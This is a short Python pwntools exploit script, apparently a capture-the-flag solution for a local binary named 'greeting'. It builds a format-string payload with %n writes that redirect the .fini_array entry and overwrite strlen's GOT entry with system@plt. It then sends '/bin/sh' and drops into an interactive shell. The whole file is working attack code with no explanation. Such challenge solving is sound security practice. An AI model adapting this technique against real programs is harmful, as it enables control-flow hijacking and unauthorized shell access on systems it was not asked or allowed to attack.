from pwn import *

gdbcmds = '''
b *(main+103)
r
'''
target = process('./greeting')
#target = gdb.debug('./greeting', gdbscript=gdbcmds)

fini_array = 0x08049934
strlen = 0x08049a54

getnline_ret = 0x08048614
system_plt = 0x08048490

payload = b"xx"+ p32(fini_array) + p32(fini_array+2) + p32(strlen) + p32(strlen+2) 
payload += b"%34288x" + b"%12$n"
payload += b"%65148x" + b"%14$n" 
payload += b"%33652x" + b"%13$n" + b"%15$n"

print("Len of payload", len(payload))

print(target.recvuntil(b"."))
target.sendline(payload)
target.sendline(b"/bin/sh\x00")
target.interactive()
